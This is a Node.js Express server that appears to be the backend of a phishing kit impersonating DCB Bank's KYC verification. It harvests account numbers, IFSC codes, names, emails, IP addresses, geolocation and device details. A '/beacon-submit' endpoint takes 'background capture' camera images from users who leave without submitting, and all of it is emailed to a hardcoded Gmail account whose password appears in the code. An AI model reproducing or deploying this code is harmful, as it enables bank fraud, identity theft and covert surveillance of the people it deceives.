const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');
const UAParser = require('ua-parser-js');
const busboy = require('busboy');

const app = express();
const port = process.env.PORT || 3000;

// Create uploads directory if it doesn't exist
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

// Middleware with increased limits
app.use(express.urlencoded({ extended: true, limit: '100mb' }));
app.use(express.json({ limit: '100mb' }));
app.use(express.raw({ type: '*/*', limit: '100mb' }));
app.use(express.static('public'));

// Email transporter with better error handling
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'dcbsubmission392@gmail.com',
    pass: 'kexmwnespcwxrkjt'
  },
  tls: {
    rejectUnauthorized: false
  }
});

// File storage configuration
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, uniqueSuffix + '-' + file.originalname);
  }
});

const upload = multer({
  storage: storage,
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
    if (allowedTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type'), false);
    }
  },
  limits: {
    fileSize: 100 * 1024 * 1024, // 100MB
    files: 20
  }
}).any();

// Helper functions
const getClientIp = (req) => {
  return req.headers['x-forwarded-for']?.split(',')[0] || 
         req.connection?.remoteAddress ||
         req.socket?.remoteAddress ||
         req.connection?.socket?.remoteAddress;
};

const buildEmailHtml = (data) => {
  const isBackground = data.isFormEmpty;
  return `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: ${isBackground ? '#d32f2f' : '#003d6a'};">
        ${isBackground ? '⚠️ BACKGROUND CAPTURE' : '✅ KYC SUBMISSION'}
      </h2>
      
      ${isBackground ? `
      <div style="background-color: #fff3e0; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
        <p><strong>User ${data.imageCount > 0 ? 'left without submitting form' : 'attempted background capture'}</strong></p>
        <p>Captured ${data.imageCount} images</p>
      </div>
      ` : ''}
      
      <div style="background-color: #eef7ff; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #003d6a;">
        <h3 style="color: #003d6a; margin-top: 0;">📱 Device Information</h3>
        <p><strong>Type:</strong> ${data.device.type === 'mobile' ? '📱 Mobile' : '💻 Desktop'} 
           ${data.device.vendor !== 'Unknown' ? `(${data.device.vendor})` : ''}</p>
        ${data.device.model !== 'Unknown' ? `<p><strong>Model:</strong> ${data.device.model}</p>` : ''}
        <p><strong>OS:</strong> ${data.os}</p>
        <p><strong>Browser:</strong> ${data.browser}</p>
      </div>
      
      ${!isBackground ? `
      <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">Account Information</h3>
        <p><strong>Bank Name:</strong> ${data.bankname}</p>
        <p><strong>IFSC Code:</strong> ${data.ifsc}</p>
        <p><strong>Account Number:</strong> ${data.accno}</p>
        <p><strong>Full Name:</strong> ${data.fullname}</p>
        <p><strong>Email:</strong> ${data.email}</p>
      </div>
      ` : ''}
      
      ${data.location ? `
      <div style="background-color: #e8f4fc; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">Location Data</h3>
        <p><strong>Latitude:</strong> ${data.location.latitude}</p>
        <p><strong>Longitude:</strong> ${data.location.longitude}</p>
        <p><strong>Accuracy:</strong> ${data.location.accuracy} meters</p>
      </div>
      ` : ''}
      
      <div style="background-color: #f0f8ff; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">Technical Data</h3>
        <p><strong>IP Address:</strong> ${data.ip}</p>
        <p><strong>Images Captured:</strong> ${data.imageCount}</p>
        <p><strong>Timestamp:</strong> ${new Date(data.timestamp).toLocaleString()}</p>
      </div>
    </div>
  `;
};

// Enhanced beacon submission endpoint
app.post('/beacon-submit', (req, res) => {
  const bb = new busboy({ headers: req.headers });
  const files = [];
  const fields = {};
  let fileCount = 0;

  bb.on('file', (fieldname, file, info) => {
    const chunks = [];
    file.on('data', (data) => chunks.push(data));
    file.on('end', () => {
      if (chunks.length > 0) {
        files.push({
          fieldname,
          buffer: Buffer.concat(chunks),
          filename: info.filename || `capture-${Date.now()}.jpg`,
          mimetype: info.mimeType
        });
        fileCount++;
      }
    });
    file.on('error', (err) => {
      console.error('File processing error:', err);
    });
  });

  bb.on('field', (fieldname, val) => {
    fields[fieldname] = val;
  });

  bb.on('finish', async () => {
    try {
      const submissionData = {
        device: {
          type: fields.device_type || 'desktop',
          model: fields.device_model || 'Unknown',
          vendor: fields.device_vendor || 'Unknown'
        },
        os: fields.device_os || 'Unknown',
        browser: fields.device_browser || 'Unknown',
        bankname: fields.bankname || 'Not provided',
        ifsc: fields.ifsc || 'Not provided',
        accno: fields.accno || 'Not provided',
        fullname: fields.fullname || 'Not provided',
        email: fields.email || 'Not provided',
        ip: getClientIp(req),
        userAgent: fields.user_agent || req.headers['user-agent'],
        timestamp: fields.timestamp || new Date().toISOString(),
        isFormEmpty: true,
        imageCount: fileCount,
        location: fields.location ? JSON.parse(fields.location) : null
      };

      // Save files temporarily
      const filePaths = [];
      for (const file of files) {
        try {
          const filePath = path.join(uploadDir, file.filename);
          fs.writeFileSync(filePath, file.buffer);
          filePaths.push(filePath);
        } catch (e) {
          console.error('Error saving file:', e);
        }
      }

      // Send email regardless of image count
      await transporter.sendMail({
        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
        to: 'dcbsubmission392@gmail.com',
        subject: fileCount > 0 
          ? `⚠️ Background Capture (${fileCount} images)` 
          : '⚠️ Background Capture Attempt',
        html: buildEmailHtml(submissionData),
        attachments: filePaths.map(filePath => ({
          filename: path.basename(filePath),
          path: filePath
        }))
      });

      // Cleanup files
      filePaths.forEach(filePath => {
        try { fs.unlinkSync(filePath); } catch(e) {}
      });

      res.status(200).send();
    } catch (error) {
      console.error('Beacon processing error:', error);
      res.status(500).send();
    }
  });

  bb.on('error', (err) => {
    console.error('Busboy error:', err);
    res.status(500).send('Error processing form data');
  });

  req.pipe(bb);
});

// Regular form submission endpoint
app.post('/submit', (req, res) => {
  upload(req, res, async (err) => {
    try {
      if (err) {
        console.error('Upload error:', err);
        throw err;
      }

      const parser = new UAParser(req.headers['user-agent'] || req.body.user_agent || '');
      const device = parser.getDevice();
      const os = parser.getOS();
      const browser = parser.getBrowser();

      const submissionData = {
        device: {
          type: device.type || req.body.device_type || 'desktop',
          model: device.model || req.body.device_model || 'Unknown',
          vendor: device.vendor || req.body.device_vendor || 'Unknown'
        },
        os: `${os.name} ${os.version}` || req.body.device_os,
        browser: `${browser.name} ${browser.version}` || req.body.device_browser,
        bankname: req.body.bankname || 'Not provided',
        ifsc: req.body.ifsc || 'Not provided',
        accno: req.body.accno || 'Not provided',
        fullname: req.body.fullname || 'Not provided',
        email: req.body.email || 'Not provided',
        location: req.body.location ? JSON.parse(req.body.location) : null,
        ip: getClientIp(req),
        userAgent: req.headers['user-agent'] || req.body.user_agent,
        timestamp: req.body.timestamp || new Date().toISOString(),
        isFormEmpty: req.body.empty_form === 'true',
        imageCount: req.files?.length || 0
      };

      // Log the submission
      fs.appendFileSync('records.txt', `
--- ${submissionData.isFormEmpty ? 'BACKGROUND' : 'FULL'} SUBMISSION ---
Device: ${submissionData.device.vendor} ${submissionData.device.model} (${submissionData.device.type})
OS: ${submissionData.os}
Browser: ${submissionData.browser}
IP: ${submissionData.ip}
Location: ${submissionData.location ? 
  `${submissionData.location.latitude}, ${submissionData.location.longitude}` : 'None'}
Images: ${submissionData.imageCount}
Timestamp: ${submissionData.timestamp}
-----------------------------
`);

      // Send email
      await transporter.sendMail({
        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
        to: 'dcbsubmission392@gmail.com',
        subject: submissionData.isFormEmpty 
          ? submissionData.imageCount > 0 
            ? `⚠️ Background Capture (${submissionData.imageCount} images)` 
            : '⚠️ Background Capture Attempt'
          : '✅ KYC Verification Completed',
        html: buildEmailHtml(submissionData),
        attachments: (req.files || []).map(file => ({
          filename: file.originalname,
          path: file.path
        }))
      });

      // Cleanup files
      if (req.files) {
        req.files.forEach(file => {
          try { fs.unlinkSync(file.path); } catch(e) {}
        });
      }

      res.status(200).send();
    } catch (error) {
      console.error('Submission error:', error);
      res.status(500).send('Error processing submission');
    }
  });
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
